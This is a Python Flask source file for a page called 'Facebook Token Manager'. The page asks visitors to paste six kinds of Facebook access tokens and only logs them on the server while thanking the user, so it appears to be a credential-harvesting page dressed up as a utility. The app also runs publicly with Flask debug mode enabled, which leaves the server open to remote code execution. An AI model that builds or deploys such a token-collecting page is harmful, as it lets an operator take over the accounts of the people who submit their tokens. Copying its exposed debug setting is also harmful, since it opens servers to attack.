from flask import Flask, request, render_template_string

# Initialize Flask application
app = Flask(__name__)

# HTML Template for the webpage (embedded within Python script)
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Token Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .btn-submit {
            width: 100%;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Facebook Token Manager</h1>
            <p>Manage and process your Facebook tokens.</p>
        </div>
        <form method="POST" action="/process">
            <div class="mb-3">
                <label for="tokenEAAG" class="form-label">Token EAAG:</label>
                <input type="text" class="form-control" id="tokenEAAG" name="tokenEAAG" required>
            </div>
            <div class="mb-3">
                <label for="tokenEAAB" class="form-label">Token EAAB:</label>
                <input type="text" class="form-control" id="tokenEAAB" name="tokenEAAB" required>
            </div>
            <div class="mb-3">
                <label for="tokenEAAD" class="form-label">Token EAAD:</label>
                <input type="text" class="form-control" id="tokenEAAD" name="tokenEAAD" required>
            </div>
            <div class="mb-3">
                <label for="tokenEAAC" class="form-label">Token EAAC:</label>
                <input type="text" class="form-control" id="tokenEAAC" name="tokenEAAC" required>
            </div>
            <div class="mb-3">
                <label for="tokenEAAF" class="form-label">Token EAAF:</label>
                <input type="text" class="form-control" id="tokenEAAF" name="tokenEAAF" required>
            </div>
            <div class="mb-3">
                <label for="tokenEABB" class="form-label">Token EABB:</label>
                <input type="text" class="form-control" id="tokenEABB" name="tokenEABB" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Submit Tokens</button>
        </form>
    </div>
</body>
</html>
"""

# Route for the main page
@app.route("/", methods=["GET"])
def index():
    return render_template_string(html_template)

# Route to handle token processing
@app.route("/process", methods=["POST"])
def process_tokens():
    # Retrieve tokens from the form
    tokenEAAG = request.form.get("tokenEAAG")
    tokenEAAB = request.form.get("tokenEAAB")
    tokenEAAD = request.form.get("tokenEAAD")
    tokenEAAC = request.form.get("tokenEAAC")
    tokenEAAF = request.form.get("tokenEAAF")
    tokenEABB = request.form.get("tokenEABB")

    # Log tokens for demonstration purposes (In production, handle securely)
    print("Received Tokens:")
    print(f"Token EAAG: {tokenEAAG}")
    print(f"Token EAAB: {tokenEAAB}")
    print(f"Token EAAD: {tokenEAAD}")
    print(f"Token EAAC: {tokenEAAC}")
    print(f"Token EAAF: {tokenEAAF}")
    print(f"Token EABB: {tokenEABB}")

    # Return confirmation response
    return f"""
    <h1>Tokens Received Successfully</h1>
    <p>Thank you for submitting your tokens. Please check the server logs for details.</p>
    <a href="/" class="btn btn-primary">Go Back</a>
    """

# Run the Flask app
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
    
